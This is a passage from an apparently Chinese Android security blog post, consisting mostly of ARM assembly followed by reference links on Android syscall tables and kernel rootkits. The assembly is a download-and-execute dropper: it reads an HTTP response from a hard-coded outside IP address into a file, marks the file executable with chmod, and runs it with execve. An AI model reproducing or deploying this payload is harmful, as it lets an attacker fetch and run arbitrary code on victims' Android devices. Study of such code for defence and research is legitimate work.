  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r3</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r6</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">nrnr</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">ldr r6</span><span style="color:#c0c5ce;">, [</span><span style="color:#8fa1b3;">r6</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L2:</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">sub </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r5</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">push </span><span style="color:#8fa1b3;">{r3}</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">len = read(sock</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">buf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">252</span><span style="color:#8fa1b3;">)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">pop </span><span style="color:#8fa1b3;">{r3}</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">cmp </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">ble L7</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L3:</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">lsl </span><span style="color:#8fa1b3;">r3</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r3</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">ldrb r1</span><span style="color:#c0c5ce;">, [</span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r3</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r3</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">cmp </span><span style="color:#8fa1b3;">r3</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r6</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">beq L4</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">cmp </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">bne L3</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">b L2</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L4:</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">sub </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">b L6</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">@写入文件</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L5:</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">sub </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r5</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">len = read(sock</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">buf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">252</span><span style="color:#8fa1b3;">)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">cmp </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">ble L7</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r0  </span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L6:  </span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r4</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@write(fd</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">buf</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">len)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">b L5</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">L7:</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">add </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">252</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r5</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">6 </span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@close(sock)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">r4</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@close(fd)</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">@执行文件</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0x1C</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">lsl </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">4 </span><span style="color:#8fa1b3;">@S_IRUSR|S_IWUSR|S_IXUSR</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">name</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@chmod(name</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">S_IRUSR|S_IWUSR|S_IXUSR)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r2</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">push </span><span style="color:#8fa1b3;">{r1}</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">adr r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">name</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">push </span><span style="color:#8fa1b3;">{r0} @argv</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">sp </span><span style="color:#8fa1b3;">@argv</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@execve(name</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">argv</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">NULL)</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r0</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
  </span><span style="color:#b48ead;">mov </span><span style="color:#8fa1b3;">r7</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">#</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">swi #</span><span style="color:#d08770;">0 </span><span style="color:#8fa1b3;">@exit(</span><span style="color:#d08770;">0</span><span style="color:#8fa1b3;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">addr:</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.short </span><span style="color:#d08770;">2 </span><span style="color:#8fa1b3;">@AF_INET</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;\x00\x50&quot; </span><span style="color:#8fa1b3;">@port</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.</span><span style="color:#96b5b4;">byte </span><span style="color:#d08770;">202</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">120</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">102 </span><span style="color:#8fa1b3;">@</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.zero </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">head:</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;GET /&quot;</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;&quot; </span><span style="color:#8fa1b3;">@file</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot; HTTP/1.1\r\n&quot;</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;HOST: &quot;</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;www.android.com&quot; </span><span style="color:#8fa1b3;">@host</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;\r\n\r\n\x00&quot;</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.zero </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">name:</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.asciz </span><span style="color:#a3be8c;">&quot;xxx&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">nrnr:</span><span style="color:#c0c5ce;">
  </span><span style="color:#8fa1b3;">.ascii </span><span style="color:#a3be8c;">&quot;\n\r\n\r&quot;</span><span style="color:#c0c5ce;">
</span></code></pre><p>
    Here for howto get system call table:</p>
<p>
    <a href="https://viaforensics.com/mobile-security/syscalltable-android-playing-rootkits.html">https://viaforensics.com/mobile-security/syscalltable-android-playing-rootkits.html</a></p>
<p>
    And a perfect android kernel rookit paper here:</p>
<p>
    <a href="http://www.phrack.org/issues/68/6.html">http://www.phrack.org/issues/68/6.html</a></p>
<p>
    &nbsp;</p>
<p>
    Code Ref</p>
<p>
    x86:&nbsp;<a href="https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_32.S">https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_32.S</a></p>
<p>
    x64:&nbsp;<a href="https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_64.S">https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/x86/kernel/entry_64.S</a></p>
<p>
    arm: <a href="https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/arm/kernel/entry-common.S">https://android.googlesource.com/kernel/common.git/+/android-3.10/arch/arm/kernel/entry-common.S</a></p>
    </div>

    
    

    <div class="post-footer">
        
            
                <div class="post-tags">
                    
                        <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
                    
                </div>
            
            
                <div class="post-nav">
                    
                        <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;android-click-hijack&#x2F;">‹ Android点击劫持</a>
                    
                    
                        <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;xinjector&#x2F;">xInjector ›</a>
                    
                    
                    
                </div>
            

        

    </div>

    
    
</article>


                </div>
            </main>

            
            
        </div>

      
          <script type="text/javascript" src="https:&#x2F;&#x2F;xjump.me&#x2F;even.js" ></script>
      
    </body>

</html>
